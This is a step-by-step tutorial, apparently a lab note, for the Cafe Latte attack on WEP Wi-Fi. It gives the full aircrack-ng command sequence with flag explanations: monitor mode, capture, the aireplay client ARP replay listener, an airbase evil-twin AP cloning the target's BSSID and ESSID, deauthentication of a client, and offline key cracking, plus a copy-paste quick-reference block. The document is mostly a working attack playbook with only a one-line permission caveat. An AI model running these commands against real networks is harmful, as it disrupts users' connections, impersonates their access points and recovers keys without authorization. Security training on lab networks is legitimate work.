# Chain #22: Cafe Latte Attack

Short purpose: when client/AP traffic is scarce, impersonate the target WEP AP (evil‑twin style) to pull a **connected client** onto a fake WEP AP and milk ARP traffic from that client. Replay those ARPs to rapidly collect IVs and crack the WEP key offline.

> You’ll typically run **four terminals**: (1) airodump capture, (2) aireplay Cafe Latte listener, (3) airbase fake AP, (4) deauth sender.

---

## Key terms (fast refresher)

- **Cafe Latte** — WEP client‑side ARP replay technique using a fake AP that mimics the real one.
- **Evil twin (WEP)** — a rogue AP broadcasting the **same BSSID/ESSID** as the target to fool clients.
- **IVs / PRGA** — per‑packet RC4 keystream inputs; lots of IVs → crack WEP with PTW/Korek.
- **Deauth** — kicks a client off the real AP so it reconnects to the fake AP.

---

## Step‑by‑step workflow (concise)

1. **Enable monitor mode**.
2. **Capture** the target AP/channel with airodump.
3. **Start Cafe Latte listener** (aireplay `-6`) to snag/replay client ARPs.
4. **Bring up fake AP** (airbase) with same BSSID/ESSID/channel in WEP mode.
5. **Deauthenticate** the target client to force it onto the fake AP.
6. **Watch ARPs flow** and IVs accumulate (airodump; listener stats).
7. **Crack WEP** from captured IVs using aircrack.

---

## Commands — statement‑by‑statement explanations

### 1) Enable monitor mode

```bash
sudo airmon-ng start wlan0
```

- **`sudo`**: requires root for interface mode changes.
- **`airmon-ng`**: helper script to toggle monitor mode.
- **`start wlan0`**: converts `wlan0` into a monitor mode iface (typically `wlan0mon`).
- **Notes shown**: processes that may interfere (NetworkManager/wpa_supplicant); chipset/driver; new interface name.

Verify:

```bash
iwconfig
```

- **Goal**: confirm `Mode:Monitor` on `wlan0mon`, frequency/channel, TX power.

---

### 2) Capture target AP traffic

```bash
airodump-ng wlan0mon -c 1 -w WEP
```

- **`airodump-ng`**: passive scanner/capture.    
- **`wlan0mon`**: monitor interface.
- **`-c 1`**: lock to channel 1 (match target AP channel).
- **`-w WEP`**: write capture files with base name `WEP` → creates `WEP-01.cap`.
- **What to watch**: target **BSSID**, **ESSID**, encryption **WEP**, connected **STATION** MACs.

---

### 3) Start Cafe Latte listener (client‑side ARP replay)

```bash
aireplay-ng -6 -D -b B2:D1:AC:E1:21:D1 -h B6:1F:98:CB:10:78 wlan0mon
```

- **`aireplay-ng`**: traffic injection/replay.
- **`-6`**: Cafe Latte attack mode (ARP replay toward a **client**).
- **`-D`**: ignore/disable AP detection checks (helps in noisy/edge cases).
- **`-b <BSSID>`**: target AP MAC to mimic (here `B2:D1:AC:E1:21:D1`).
- **`-h <client MAC>`**: targeted station (here `B6:1F:98:CB:10:78`). May need to spoof your interface MAC to this value if prompted.
- **Effect**: listens for the client and replays ARPs **to the client**; saves ARPs to `replay_arp-*.cap` and shows counters (ARPs seen/sent).

---

### 4) Launch the fake WEP AP (evil twin)

```bash
airbase-ng -c 1 -a B2:D1:AC:E1:21:D1 -e "HackTheWifi" wlan0mon -W 1 -L
```

- **`airbase-ng`**: rogue AP framework.    
- **`-c 1`**: broadcast on channel 1 (must match target channel).
- **`-a <BSSID>`**: **same BSSID** as the real AP (clones MAC).
- **`-e "ESSID"`**: **same ESSID** (`HackTheWifi`).
- **`wlan0mon`**: interface that will transmit beacons/frames.
- **`-W 1`**: enable **WEP** mode (key index 1).
- **`-L`**: enable Cafe Latte logic within airbase (helps farm ARPs from clients).
- **Expected output**: creation of TAP interface `at0`, MTU tweaks, “Access Point started”, and later “Starting Caffe‑Latte attack against ”.

---

### 5) Force the client to the fake AP (deauth)

```bash
aireplay-ng -0 10 -a B2:D1:AC:E1:21:D1 -c B6:1F:98:CB:10:78 wlan0mon
```

- **`-0 10`**: send **10** deauthentication bursts.    
- **`-a <BSSID>`**: target real AP MAC.
- **`-c <client MAC>`**: specific client to kick.
- **Effect**: client drops off the real AP and (ideally) reassociates to the fake AP with the same BSSID/ESSID.
- **Tell‑tales**: airbase terminal logs repeated **“Client associated (WEP)”** lines; the listener terminal (`-6`) shows ARP counts increasing.

---

### 6) Let ARPs and IVs accumulate

- Keep **airodump** running to capture replies into `WEP-01.cap` and watch `#Data` grow.
- The **Cafe Latte listener** will show totals like `Read … (xxxx ARPs, … sent … pps)` — that’s good; more ARPs → more IVs.
- If ARPs stall: rerun deauth (Terminal 4) and immediately ensure airbase (`-L`) is still up.

---

### 7) Crack the WEP key (offline)

```bash
aircrack-ng -b B2:D1:AC:E1:21:D1 WEP-01.cap
```

- **`aircrack-ng`**: offline WEP key recovery.    
- **`-b <BSSID>`**: select target AP in the capture.
- **`WEP-01.cap`**: the file where airodump saved IVs.
- **Behavior**: runs PTW/Korek; once IVs are sufficient you’ll see `KEY FOUND! [ … ]`.

---

## Quick reference (copy/paste block)

```bash
# 1) Monitor mode
sudo airmon-ng start wlan0 && iwconfig

# 2) Capture on target channel
airodump-ng wlan0mon -c 1 -w WEP

# 3) Cafe Latte listener (client‑side ARP replay)
aireplay-ng -6 -D -b <AP_BSSID> -h <CLIENT_MAC> wlan0mon

# 4) Fake WEP AP (evil twin) — same BSSID/ESSID/channel
airbase-ng -c 1 -a <AP_BSSID> -e "<ESSID>" wlan0mon -W 1 -L

# 5) Deauth client off the real AP (force to fake AP)
aireplay-ng -0 10 -a <AP_BSSID> -c <CLIENT_MAC> wlan0mon

# 6) (Monitor) Let ARPs/IVs flow; keep airodump running

# 7) Crack once IVs are high
aircrack-ng -b <AP_BSSID> WEP-01.cap
```

---

## Summary (one‑paragraph)

Cafe Latte targets **clients** instead of the AP: you clone the AP (same BSSID/ESSID) in WEP mode, kick a client so it associates to your fake AP, and then farm its ARP traffic. Replaying those ARPs rapidly fills your capture with IVs, enabling a straightforward **aircrack‑ng** recovery of the WEP key.

---

### Practical tips & gotchas

- Spoof your interface MAC to the client’s MAC when the tools prompt, to avoid packet drops.
- Ensure channel/BSSID/ESSID are **exact matches** between real and fake AP.
- If no ARPs appear, re‑run deauth and confirm airbase is still broadcasting with `-L` enabled.
- Legal/ethical: only test against networks you own or have explicit written permission to assess.